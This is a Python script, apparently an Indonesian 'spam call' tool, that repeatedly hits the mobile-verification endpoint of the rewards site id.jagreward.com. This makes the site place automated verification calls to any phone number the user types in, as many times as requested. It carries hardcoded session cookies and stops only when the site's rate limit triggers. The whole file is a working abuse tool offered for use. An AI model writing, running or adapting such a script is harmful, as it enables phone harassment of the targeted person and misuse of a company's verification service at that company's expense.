#coding=utf-8
import os, requests, json, re
from time import sleep
_r = '\033[1;31m'
_h = '\033[1;32m'
_k = '\033[1;33m'
_p = '\033[1;0m'
os.system("clear")
hed = {
    "X-Requested-With": "XMLHttpRequest",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
"Content-Type": "application/json",
"Origin": "https://id.jagreward.com",
"Referer": "https://id.jagreward.com/member/register/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
"__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
"_ga": "GA1.2.2037151396.1584709855",
"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
"DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
}
print(_r+"____ ___  ____ _  _ ____ ____ _    _")
print(_k+"[__  |__] |__| |\/| |    |__| |    |   ") 
print(_h+"___] |    |  | |  | |___ |  | |___ |___ ")       
print (_p+"Author : Safar/Cupu\nTeam   : XiuzCode")
print('=' *39)
no = input("NoPe|Ex8228823****: ")
jum = int(input("Jumlah Spam : "))
url = "https://id.jagreward.com/member/verify-mobile/"+no
res ={ "method": "CALL",
"countryCode":"id",}
for x in range (jum):
	s = requests.get(url,data=res, headers=hed).text
	if "Anda telah meminta kode verifikasi melebihi batas yang diizinkan. Harap tunggu sebentar sebelum membuat permintaan kode verifikasi yang lain." in s:
		print("Gagal Mengirim ke "+no)
		break
	elif "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in s:
		print("Berhasil kirim ke " +no)
		sleep(30)
	elif "Tolong masukkan nomor telepon anda dengan benar" in s:
		print("Masukkan No yang benar Anjing... ")
		break
